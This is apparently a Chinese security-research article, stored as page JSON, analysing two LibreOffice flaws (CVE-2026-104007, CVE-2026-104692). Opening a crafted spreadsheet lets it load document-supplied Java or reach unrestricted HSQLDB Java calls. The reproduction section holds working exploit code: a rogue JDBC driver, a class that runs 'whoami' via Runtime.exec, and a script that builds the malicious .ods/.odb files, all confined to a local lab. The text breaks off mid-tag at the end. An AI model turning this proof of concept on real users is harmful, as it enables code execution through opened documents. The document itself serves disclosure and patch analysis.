[{"_1":2,"_3":4},"root",{"_5":158},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":-5,"_41":-5,"_42":43,"_44":-5,"_45":46,"_47":48,"_49":50,"_51":52,"_53":37,"_54":37,"_55":-5,"_56":57,"_58":59},"expiresAt",1795135241000,"id","pqb2lvhyjfidsw1ft4216qs1h","title","LibreOffice JDBC 驱动加载与 HSQLDB 任意代码执行漏洞分析：CVE-2026-104007 与 CVE-2026-104692","originalTitle","CVE-2026-104007与CVE-2026-104692 LibreOffice JDBC驱动加载与HSQLDB任意代码执行漏洞分析","summary","本文分析 LibreOffice 的 CVE-2026-104007 与 CVE-2026-104692 两处缺陷：前者因 JDBC 驱动加载位置取自数据库文档本身，打开文档即可加载并运行文档提供的 Java 代码；后者因捆绑的 HSQLDB 在通用 JDBC 驱动下不限制可调用方法，SQL 可调用任意 Java 方法执行代码。","reason","从源码层面拆解了两条漏洞的触发路径与修复差异，并给出可复现的 PoC 文档生成流程，便于判断自用环境是否受影响。","source",{"_64":157},"links",{"_149":156},"publishedAt","2026-11-18T06:23:48.000Z","discoveredAt","2026-11-18T08:36:39.563Z","timelineAt","category","disclosure","tags",[152,153,154,155,65],"score",74,"selected",true,"channel","news","story","x","readingMode","full","author","body",{"_59":148,"_149":-5,"_150":149,"_151":37},"outline",[68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92],"relatedStories",[],"topics",[60,61],"indexable","markdownAvailable","group","hasTranslation",false,"bodyLanguage","zh",{"_62":66,"_64":67},{"_62":63,"_64":65},"slug","research","name","技术研究","vuln","漏洞披露",{"_11":146,"_94":147,"_96":97},{"_11":144,"_94":145,"_96":97},{"_11":142,"_94":143,"_96":97},{"_11":140,"_94":141,"_96":97},{"_11":138,"_94":139,"_96":97},{"_11":136,"_94":137,"_96":97},{"_11":134,"_94":135,"_96":102},{"_11":132,"_94":133,"_96":102},{"_11":130,"_94":131,"_96":102},{"_11":128,"_94":129,"_96":102},{"_11":126,"_94":127,"_96":102},{"_11":124,"_94":125,"_96":97},{"_11":122,"_94":123,"_96":97},{"_11":120,"_94":121,"_96":102},{"_11":118,"_94":119,"_96":102},{"_11":116,"_94":117,"_96":107},{"_11":114,"_94":115,"_96":107},{"_11":112,"_94":113,"_96":107},{"_11":110,"_94":111,"_96":107},{"_11":108,"_94":109,"_96":107},{"_11":105,"_94":106,"_96":107},{"_11":103,"_94":104,"_96":102},{"_11":100,"_94":101,"_96":102},{"_11":98,"_94":99,"_96":97},{"_11":93,"_94":95,"_96":97},"sec-25","text","参考","level",2,"sec-24","九、修复措施","sec-23","CVE-2026-104692",3,"sec-22","CVE-2026-104007","sec-21","生成恶意文档",4,"sec-20","server.py","sec-19","make_docs.py","sec-18","RceProof.java","sec-17","Probe.java","sec-16","Marker.java","sec-15","构建POC","sec-14","触发流程","sec-13","八、漏洞复现","sec-12","七、漏洞分析","sec-11","5. 验证俩个版本都能运行","sec-10","4. 解压 Java 和两个 LibreOffice","sec-9","3. 下载JAVA","sec-8","2. 下载LibreOffice","sec-7","1. 创建测试目录","sec-6","六、环境搭建","sec-5","五、利用条件","sec-4","四、影响组件","sec-3","三、受影响版本","sec-2","二、基本信息","sec-1","一、漏洞说明","<h2 id=\"sec-1\">一、漏洞说明</h2><p>通告在 <a href=\"https://www.libreoffice.org/security/\">https://www.libreoffice.org/security/</a> 。</p><p>LibreOffice 可以通过用 Java 编写的 JDBC 驱动程序连接到数据库。电子表格可以使用数据库作为数据透视表的数据源，而描述连接的数据库文档会指定要使用的驱动程序。</p><p>驱动程序的加载位置取自数据库文档本身，因此精心构造的文档可以让 LibreOffice 加载并运行文档打开时提供的 Java 代码。这与 CVE-2026-63277 修复的问题途径不同。</p><p>在固定版本中，驱动程序位置仅取自用户的驱动程序配置，并且源是由 URL 命名的数据库文档的透视表仅在用户允许更新链接后才会连接</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142418-af3f5a10-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=af27f16e1a4f90cd\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142418-af3f5a10-e318-1.png&amp;mode=thumb&amp;exp=1795392000&amp;sig=489efb4d2b747c37 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142418-af3f5a10-e318-1.png&amp;mode=image-1200&amp;exp=1795392000&amp;sig=aff3d92e8c6ee91d 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142418-af3f5a10-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=af27f16e1a4f90cd 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1706\"></p><p>CVE-2026-104692</p><p>LibreOffice 捆绑了 HSQLDB 数据库引擎，该引擎既可以通过通用的 JDBC 数据库驱动程序使用，也可以通过对嵌入式数据库的支持来使用。HSQLDB 允许 SQL 语句调用 Java 方法，但仅限于允许的类。</p><p>当通过通用 JDBC 驱动程序使用 HSQLDB 时，此限制不适用，因此精心构造的文档中的 SQL 可以调用任何 Java 方法并运行代码。</p><p>在固定版本中，无论通过何种方式访问数据库，SQL 都只能调用 HSQLDB 的内置函数。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142418-af906d56-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=c33e163b29e06c4c\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142418-af906d56-e318-1.png&amp;mode=thumb&amp;exp=1795392000&amp;sig=bc67dc5735482387 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142418-af906d56-e318-1.png&amp;mode=image-1200&amp;exp=1795392000&amp;sig=3df9479c895665df 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142418-af906d56-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=c33e163b29e06c4c 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"962\"></p><h2 id=\"sec-2\">二、基本信息</h2><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>公开时间</p></td><td colspan=\"1\" rowspan=\"1\"><p>2026-11-16</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>编号</p></td><td colspan=\"1\" rowspan=\"1\"><p>CVE-2026-104007 / CVE-2026-104692</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>威胁类型</p></td><td colspan=\"1\" rowspan=\"1\"><p>打开文档即加载文档指定的 Java</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>CVSS</p></td><td colspan=\"1\" rowspan=\"1\"><p>厂商通告没有写向量。360 的风险通告写的是 CVSS 4.0 8.5</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>利用条件</p></td><td colspan=\"1\" rowspan=\"1\"><p>用户打开文档；本机 Java 可用</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>修复 commit</p></td><td colspan=\"1\" rowspan=\"1\"><p>26.2.7 类路径 <code>85e3ff48</code>，SystemProperties <code>a80a37b8</code>，HSQLDB <code>527a7490</code>。26.8.2 对应 <code>41467909</code>、<code>5985a323</code>、<code>90c3fd97</code></p></td></tr></tbody></table><h2 id=\"sec-3\">三、受影响版本</h2><p>厂商公告的修复版本是 26.2.7 和 26.8.2。范围是 26.2 低于 26.2.7，以及 26.8 低于 26.8.2</p><h2 id=\"sec-4\">四、影响组件</h2><p>受影响的是 LibreOffice 自带的 Base 数据库接入和 Calc 表单。表单把 <code>form:apply-design-mode</code> 设成 false 时，会在打开表格的过程中连接数据源。这个动作走的是表单，不走宏，宏安全对话框不会弹出来。数据源是远程 odb 时，下载和连接在同一次打开里。</p><h2 id=\"sec-5\">五、利用条件</h2><p>类路径要进 <code>URLClassLoader</code>，表格得用 <code>form:datasource</code> 指向那份 odb，odb 的 <code>db:java-classpath</code> 得指向实际放了 <code>.class</code> 的文件。这次生成文档时路径是已知的，写的就是这张 ods 的 <code>file:</code> 地址。odb 被过滤器导入之后，这份属性在 <code>setPropertyInfo()</code> 里写进数据源。26.2.6 在这里把文档路径合并进去，26.2.7 在这里删掉。</p><p>要走 <code>CALL</code>，驱动类得是 HSQLDB，并且 <code>form:escape-processing=\"false\"</code>，语句才能到 <code>supportsJavaMethod()</code>。只靠 <code>connect()</code> 时，驱动类写成文档里的那个 class 就够了，白名单插不进来。</p><h2 id=\"sec-6\">六、环境搭建</h2><h3 id=\"sec-7\">1. 创建测试目录</h3><pre><code>mkdir C:\\lo-lab\\lab C:\\lo-lab\\payload C:\\lo-lab\\markers</code></pre><h3 id=\"sec-8\">2. 下载LibreOffice</h3><p>漏洞版本，存为C:\\lo-lab\\lo-2626.msi</p><p><a href=\"https://downloadarchive.documentfoundation.org/libreoffice/old/26.2.6.2/win/x86_64/LibreOffice_26.2.6.2_Win_x86-64.msi\">https://downloadarchive.documentfoundation.org/libreoffice/old/26.2.6.2/win/x86_64/LibreOffice_26.2.6.2_Win_x86-64.msi</a></p><p>修复版本，存为C:\\lo-lab\\lo-2627.msi</p><p><a href=\"https://downloadarchive.documentfoundation.org/libreoffice/old/26.2.7.3/win/x86_64/LibreOffice_26.2.7.3_Win_x86-64.msi\">https://downloadarchive.documentfoundation.org/libreoffice/old/26.2.7.3/win/x86_64/LibreOffice_26.2.7.3_Win_x86-64.msi</a></p><h3 id=\"sec-9\">3. 下载JAVA</h3><p>Java 21 JDK，存为C:\\lo-lab\\jdk21.zip</p><p><a href=\"https://api.adoptium.net/v3/binary/latest/21/ga/windows/x64/jdk/hotspot/normal/eclipse\">https://api.adoptium.net/v3/binary/latest/21/ga/windows/x64/jdk/hotspot/normal/eclipse</a></p><h3 id=\"sec-10\">4. 解压 Java 和两个 LibreOffice</h3><p>为什么用<code>msiexec /a</code> 叫\"管理安装\"：只把程序文件解包到指定目录，<strong>不写开始菜单、不进控制面板、不碰系统注册表</strong></p><pre><code>tar -xf C:\\lo-lab\\jdk21.zip -C C:\\lo-lab\nren C:\\lo-lab\\jdk-21* jdk21\nmsiexec /a C:\\lo-lab\\lo-2626.msi /qn TARGETDIR=C:\\lo-lab\\lo-2626</code></pre><p>等上面这条完全跑完再跑下面的命令</p><pre><code>msiexec /a C:\\lo-lab\\lo-2627.msi /qn TARGETDIR=C:\\lo-lab\\lo-2627</code></pre><h3 id=\"sec-11\">5. 验证俩个版本都能运行</h3><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142419-afc82dbc-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=18c0b4d5743cd2a6\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142419-afc82dbc-e318-1.png&amp;mode=thumb&amp;exp=1795392000&amp;sig=68cbb3478a257b49 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142419-afc82dbc-e318-1.png&amp;mode=image-1200&amp;exp=1795392000&amp;sig=a682855dd09dcbf2 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142419-afc82dbc-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=18c0b4d5743cd2a6 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"747\"></p><h2 id=\"sec-12\">七、漏洞分析</h2><p>表格打开时，表单的 <code>form:datasource</code> 进来只是个字符串属性。轮到表单建连接，才会有人拿它去要数据源</p><pre><code>if ( !m_aDataSourceName.isEmpty() )\n{\n    Reference&lt; XDatabaseContext &gt; xDatabaseContext( DatabaseContext::create(m_aContext) );\n    ...\n    Reference&lt; XDataSource &gt; xDataSource( xDatabaseContext-&gt;getByName( m_aDataSourceName ), UNO_QUERY_THROW );</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142419-b0196110-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=e5bcfde3bee8e32f\" loading=\"lazy\" decoding=\"async\" width=\"1155.3333333333333\"></p><p>getByName 先查注册表。名字没注册过，就按 URL 处理：</p><pre><code>/* databasecontext.cxx:604 */\nOUString sURL;\nif ( hasRegisteredDatabase( _rName ) )\n{\n    sURL = getDatabaseLocation( _rName );\n}\nelse\n    // interpret the name as URL\n    sURL = _rName;\n\nif ( !xExistent.is() )\n    xExistent = loadObjectFromURL( _rName, sURL );</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142420-b06b8a84-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=78dd6c314551c8f2\" loading=\"lazy\" decoding=\"async\" width=\"1155.3333333333333\"></p><p>注册过的数据源指向用户登记的位置。没注册的名字直接当 URL 加载，这条分支不需要\"允许更新链接\"之类的许可，表单因此能静默拉外部 ODB。</p><p>下载和加载在 loadObjectFromURL：</p><pre><code>/* databasecontext.cxx:273 */\n::ucbhelper::Content aContent( _sURL, nullptr, comphelper::getProcessComponentContext() );\nif ( !aContent.isDocument() )        // 存在性探测\n    throw InteractiveIOException(... IOErrorCode_NO_FILE ...);\n...\nReference&lt; XLoadable &gt; xLoad( xModel, UNO_QUERY_THROW );\n::comphelper::NamedValueCollection aArgs;\naArgs.put( u\"URL\"_ustr, _sURL );\naArgs.put( u\"MacroExecutionMode\"_ustr, MacroExecMode::USE_CONFIG );\n...                                 // XLoadable::load，把 ODB 当文档加载</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142420-b0bf9feb-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=89e453fd3ab6f2be\" loading=\"lazy\" decoding=\"async\" width=\"1155.3333333333333\"></p><p>取下来的 ODB 由 ODBFilter 解析。<code>db:java-classpath</code> 属性在这里改名成 <code>JavaDriverClassPath</code>，塞进 Info：</p><pre><code>/* xmlDataSource.cxx:144 */\ncase XML_JAVA_CLASSPATH:\n    aProperty.Name = \"JavaDriverClassPath\";\n    break;\n...\nif ( !aProperty.Name.isEmpty() )\n{\n    ...\n    rImport.addInfo(aProperty);\n}</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142421-b114da8d-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=556b2744ffd77a31\" loading=\"lazy\" decoding=\"async\" width=\"1155.3333333333333\"></p><p><code>db:data-source-setting name=\"JavaDriverClassPath\"</code> 那条路也走 addInfo。在 C++ 内部是同一个 Info 序列，所以修复在下游切一刀，两种载体一起断。官方回归测试的样例把两种载体都带上，断言的是合流以后的状态。</p><p>合流点在 setPropertyInfo。整个 dbaccess 里，两个 tag 的差异只有这一处：</p><pre><code> void ODBFilter::setPropertyInfo()\n {\n     ...\n     Sequence&lt;PropertyValue&gt; aInfo;\n     if ( !m_aInfoSequence.empty() )\n         aInfo = comphelper::containerToSequence(m_aInfoSequence);\n-    aDataSourceSettings.merge( ::comphelper::NamedValueCollection( aInfo ), true );\n+    ::comphelper::NamedValueCollection aDocumentSettings( aInfo );\n+    // The Java class path of a driver and the Java system properties come from the driver\n+    // configuration, not the document.\n+    aDocumentSettings.remove( u\"JavaDriverClassPath\"_ustr );\n+    aDocumentSettings.remove( u\"SystemProperties\"_ustr );\n+    // CreateDatabase asks the driver for a new database, which only the user does from the UI.\n+    aDocumentSettings.remove( u\"CreateDatabase\"_ustr );\n+    aDataSourceSettings.merge( aDocumentSettings, true );\n }</code></pre><h2 id=\"sec-13\">八、漏洞复现</h2><h3 id=\"sec-14\">触发流程</h3><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142422-b16989d9-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=ea98dcf995754470\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142422-b16989d9-e318-1.png&amp;mode=thumb&amp;exp=1795392000&amp;sig=7555e4ae69489722 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142422-b16989d9-e318-1.png&amp;mode=image-1200&amp;exp=1795392000&amp;sig=50f4214c0c04396d 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142422-b16989d9-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=ea98dcf995754470 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"918\"></p><h3 id=\"sec-15\">构建POC</h3><h4 id=\"sec-16\">Marker.java</h4><pre><code>package lab;\n\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.sql.Connection;\nimport java.sql.Driver;\nimport java.sql.DriverPropertyInfo;\nimport java.sql.SQLException;\nimport java.sql.SQLFeatureNotSupportedException;\nimport java.util.Properties;\nimport java.util.logging.Logger;\n\n/** PoC JDBC driver: marker only, no shell, writes confined to C:\\lo-lab\\markers */\npublic class Marker implements Driver {\n    public static final String PREFIX = \"jdbc:lab:\";\n    public static final String MARKER_DIR = \"C:\\\\lo-lab\\\\markers\";\n\n    static {\n        try { java.sql.DriverManager.registerDriver(new Marker()); } catch (Throwable t) {}\n    }\n\n    public Connection connect(String url, Properties info) throws SQLException {\n        if (url != null &amp;&amp; url.startsWith(PREFIX)) {\n            write(url.substring(PREFIX.length()));\n        }\n        return null; // 不提供真实连接：标记写出即达成本轮目的\n    }\n\n    public boolean acceptsURL(String url) { return url != null &amp;&amp; url.startsWith(PREFIX); }\n    public DriverPropertyInfo[] getPropertyInfo(String u, Properties p) { return new DriverPropertyInfo[0]; }\n    public int getMajorVersion() { return 1; }\n    public int getMinorVersion() { return 0; }\n    public boolean jdbcCompliant() { return false; }\n    public Logger getParentLogger() throws SQLFeatureNotSupportedException { throw new SQLFeatureNotSupportedException(); }\n\n    /** HSQLDB CALL 轮入口: CALL \"lab.Marker.mark\"('&lt;path&gt;') */\n    public static void mark(String path) { write(path); }\n\n    static void write(String path) {\n        try {\n            File f = new File(path).getCanonicalFile();\n            File dir = new File(MARKER_DIR).getCanonicalFile();\n            String p = f.getPath(), d = dir.getPath();\n            if (!p.startsWith(d + File.separatorChar)) return;  // 只允许 markers 目录内\n            try (FileOutputStream o = new FileOutputStream(f)) {\n                o.write(\"marker\\n\".getBytes(\"UTF-8\"));          // 7 字节，与原实验一致\n            }\n        } catch (Throwable t) { /* 静默：不改变宿主行为 */ }\n    }\n}\n</code></pre><h4 id=\"sec-17\">Probe.java</h4><pre><code>import java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\n/** 对照两版 hsqldb.jar：accessibleJavaMethodNames 与 supportsJavaMethod() 的行为 */\npublic class Probe {\n    public static void main(String[] args) throws Exception {\n        Class&lt;?&gt; c = Class.forName(\"org.hsqldb.persist.HsqlDatabaseProperties\");\n        Method m = c.getMethod(\"supportsJavaMethod\", String.class);\n        Field f = c.getDeclaredField(\"accessibleJavaMethodNames\");\n        f.setAccessible(true);\n        System.out.println(\"accessibleJavaMethodNames=\" + f.get(null));\n        Object r = m.invoke(null, args[0]);\n        System.out.println(\"supportsJavaMethod(\" + args[0] + \")=\" + r);\n    }\n}\n</code></pre><h4 id=\"sec-18\">RceProof.java</h4><pre><code>package lab;\n\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.net.InetAddress;\nimport java.sql.Connection;\nimport java.sql.Driver;\nimport java.sql.DriverPropertyInfo;\nimport java.sql.SQLException;\nimport java.sql.SQLFeatureNotSupportedException;\nimport java.util.Properties;\nimport java.util.logging.Logger;\n\n/** RCE 一锤定音轮：connect() 触发 Runtime.exec 跑 whoami，输出限定在 markers 目录。\n    证据文件两段：cmd 原生输出（&gt; 重定向）+ Java 侧追加行 —— 同一文件同时证明\n    “操作系统命令被执行”与“Java 代码在 LO 的 JVM 里运行”。 */\npublic class RceProof implements Driver {\n    public static final String PREFIX = \"jdbc:lab:\";\n\n    public Connection connect(String url, Properties info) throws SQLException {\n        if (url != null &amp;&amp; url.startsWith(PREFIX)) {\n            try {\n                Process p = Runtime.getRuntime().exec(new String[]{\n                    \"cmd\", \"/c\", \"whoami&gt;C:\\\\lo-lab\\\\markers\\\\rce-proof.txt\"});\n                p.waitFor();\n                try (FileOutputStream o = new FileOutputStream(\n                        new File(\"C:\\\\lo-lab\\\\markers\\\\rce-proof.txt\"), true)) {\n                    o.write(String.format(\n                        \"--- appended from Java: user=%s host=%s jvm=%s%n\",\n                        System.getProperty(\"user.name\"),\n                        InetAddress.getLocalHost().getHostName(),\n                        System.getProperty(\"java.vm.name\")).getBytes(\"UTF-8\"));\n                }\n            } catch (Throwable t) { /* silent */ }\n        }\n        return null;\n    }\n\n    public boolean acceptsURL(String url) { return url != null &amp;&amp; url.startsWith(PREFIX); }\n    public DriverPropertyInfo[] getPropertyInfo(String u, Properties p) { return new DriverPropertyInfo[0]; }\n    public int getMajorVersion() { return 1; }\n    public int getMinorVersion() { return 0; }\n    public boolean jdbcCompliant() { return false; }\n    public Logger getParentLogger() throws SQLFeatureNotSupportedException { throw new SQLFeatureNotSupportedException(); }\n}\n</code></pre><h4 id=\"sec-19\">make_docs.py</h4><pre><code># -*- coding: utf-8 -*-\n\"\"\"Author PoC documents natively via LibreOffice UNO (run with LO's bundled python).\n\nConnects to headless soffice on 127.0.0.1:2002 (started by make_all.cmd).\nCreates per (tag, mode):\n  payload/poc-&lt;tag&gt;-&lt;mode&gt;.ods  form with URL datasource -&gt; payload/odb-&lt;tag&gt;-&lt;mode&gt;.odb\n  payload/odb-&lt;tag&gt;-&lt;mode&gt;.odb  created via DataSource API (or kept if hand-built loads)\nUsage: python.exe make_docs.py            # author ods for all 4 combos\n       python.exe make_docs.py loadtest   # only try loading hand-built odb\n\"\"\"\nimport sys, uno\nfrom com.sun.star.beans import PropertyValue\n\nDSBASE = \"http://127.0.0.1:18751\"\nPDIR = \"C:/lo-lab/payload\"\nMODE = sys.argv[1] if len(sys.argv) &gt; 1 else \"author\"\n\ndef pv(name, value):\n    p = PropertyValue(); p.Name = name; p.Value = value; return p\n\ndef connect(retries=30, delay=2):\n    import time\n    ctxLocal = uno.getComponentContext()\n    resolver = ctxLocal.ServiceManager.createInstanceWithContext(\n        \"com.sun.star.bridge.UnoUrlResolver\", ctxLocal)\n    last = None\n    for _ in range(retries):\n        try:\n            return resolver.resolve(\n                \"uno:socket,host=127.0.0.1,port=2002;urp;StarOffice.ComponentContext\")\n        except Exception as e:\n            last = e\n            time.sleep(delay)\n    raise last\n\nctx = connect()\nsmgr = ctx.ServiceManager\ndesktop = smgr.createInstanceWithContext(\"com.sun.star.frame.Desktop\", ctx)\n\ndef loadtest_odb():\n    try:\n        doc = desktop.loadComponentFromURL(\n            \"file:///\" + PDIR + \"/odb-2626-connect.odb\", \"_blank\", 0,\n            (pv(\"Hidden\", True), pv(\"ReadOnly\", True)))\n        print(\"HANDMADE_ODB_LOAD=OK\")\n        try:\n            doc.dispose()\n        except Exception:\n            pass\n        return True\n    except Exception as e:\n        print(\"HANDMADE_ODB_LOAD=FAIL\", repr(e)[:200])\n        return False\n\ndef make_odb(tag, mode):\n    \"\"\"Create fresh odb via DataSource API and storeAsURL.\"\"\"\n    marker = f\"C:/lo-lab/markers/marker-{tag}-{mode}.txt\"\n    if mode == \"connect\":\n        url, drv = \"jdbc:lab:\" + marker, \"lab.Marker\"\n    else:\n        url, drv = \"jdbc:hsqldb:mem:lab\", \"org.hsqldb.jdbcDriver\"\n    classpath = f\"file:///{PDIR}/poc-{tag}-{mode}.ods\"\n    ds = smgr.createInstanceWithContext(\"com.sun.star.sdb.DataSource\", ctx)\n    ds.URL = url\n    ds.Info = uno.Any(\"[]com.sun.star.beans.PropertyValue\", (\n        pv(\"JavaDriverClass\", drv),\n        pv(\"JavaDriverClassPath\", classpath),\n        pv(\"ParameterNameSubstitution\", False),\n    ))\n    doc = ds.DatabaseDocument\n    out = f\"file:///{PDIR}/odb-{tag}-{mode}.odb\"\n    doc.storeAsURL(out, ())\n    doc.close()\n    print(\"ODB_STORED\", out)\n\ndef make_ods(tag, mode):\n    marker = f\"C:/lo-lab/markers/marker-{tag}-{mode}.txt\"\n    doc = desktop.loadComponentFromURL(\n        \"private:factory/scalc\", \"_blank\", 0, (pv(\"Hidden\", True),))\n    sheet = doc.Sheets.getByIndex(0)\n    dp = sheet.DrawPage\n    forms = dp.Forms\n    form = doc.createInstance(\"com.sun.star.form.component.Form\")\n    form.Name = \"poc\"\n    form.DataSourceName = f\"{DSBASE}/odb-{tag}-{mode}.odb\"\n    if mode in (\"connect\", \"rce\"):\n        form.CommandType = 0          # TABLE\n        form.Command = \"T\"\n        form.EscapeProcessing = True\n    else:\n        form.CommandType = 2          # COMMAND (raw SQL)\n        form.Command = f\"CALL \\\"lab.Marker.mark\\\"('{marker}')\"\n        form.EscapeProcessing = False\n    lb = doc.createInstance(\"com.sun.star.form.component.ListBox\")\n    lb.Name = \"lb1\"\n    form.insertByName(\"lb1\", lb)\n    forms.insertByName(\"poc\", form)\n    shape = doc.createInstance(\"com.sun.star.drawing.ControlShape\")\n    from com.sun.star.awt import Point, Size\n    shape.Position = Point(1000, 1000)\n    shape.Size = Size(8000, 1000)\n    shape.setControl(lb)\n    dp.add(shape)\n    out = f\"file:///{PDIR}/poc-{tag}-{mode}.ods\"\n    doc.storeAsURL(out, (pv(\"FilterName\", \"calc8\"),))\n    doc.close(False)\n    print(\"ODS_STORED\", out)\n\nif MODE == \"loadtest\":\n    loadtest_odb()\nelse:\n    handmade_ok = loadtest_odb()\n    for tag in (\"2626\", \"2627\"):\n        for m in (\"connect\", \"call\", \"rce\"):\n            if not handmade_ok:\n                make_odb(tag, m)\n            make_ods(tag, m)\n</code></pre><h4 id=\"sec-20\">server.py</h4><p>一个http server服务器</p><pre><code># -*- coding: utf-8 -*-\n\"\"\"Serve payload dir on 127.0.0.1:18751 (replacement for the original http.server).\"\"\"\nimport http.server, socketserver, os, sys, datetime\n\nROOT = r\"C:\\lo-lab\\payload\"\nPORT = 18751\n\nclass H(http.server.SimpleHTTPRequestHandler):\n    def log_message(self, fmt, *args):\n        line = \"%s [%s] %s\" % (datetime.datetime.now().strftime(\"%H:%M:%S\"), self.address_string(), fmt % args)\n        print(line, flush=True)\n        with open(r\"C:\\lo-lab\\http.log\", \"a\", encoding=\"utf-8\") as f:\n            f.write(line + \"\\n\")\n    def do_OPTIONS(self):  # LO may probe; original lab also returned 501 here\n        self.send_error(501, \"Unsupported method\")\n\n    def __init__(self, *a, **kw):\n        os.chdir(ROOT)\n        super().__init__(*a, **kw)\n\nsocketserver.ThreadingTCPServer.allow_reuse_address = False  # Windows 下 True 会造成重复绑定\nwith socketserver.ThreadingTCPServer((\"127.0.0.1\", PORT), H) as httpd:\n    print(f\"serving {ROOT} on 127.0.0.1:{PORT}\", flush=True)\n    httpd.serve_forever()\n</code></pre><h4 id=\"sec-21\">生成恶意文档</h4><h5>1.1. 生成表格文件</h5><p>先执行C:\\lo-lab\\lab\\make_all.cmd，使用漏洞版本的LibreOffice自己的编程接口（UNO）生成4个表格文件</p><pre><code>@echo off\nrem Author documents: start payload server + headless LO socket, run UNO script, clean up\ncd /d C:\\lo-lab\\lab\ndel C:\\lo-lab\\http.log 2&gt;nul\nstart \"payload\" /min E:\\appinstall\\python116\\python.exe C:\\lo-lab\\lab\\serve.py\ntimeout /t 2 /nobreak &gt;nul\nstart \"lo\" /b C:\\lo-lab\\lo-2626\\program\\soffice.com --headless --norestore --nologo --nofirststartwizard -env:UserInstallation=file:///C:/lo-lab/profile-2626 \"--accept=socket,host=127.0.0.1,port=2002;urp;\"\nC:\\lo-lab\\lo-2626\\program\\python.exe C:\\lo-lab\\lab\\make_docs.py %*\ntaskkill /f /im soffice.bin &gt;nul 2&gt;&amp;1\ntaskkill /f /im python.exe /fi \"WINDOWTITLE eq payload*\" &gt;nul 2&gt;&amp;1\necho AUTHOR_DONE\n</code></pre><p><img 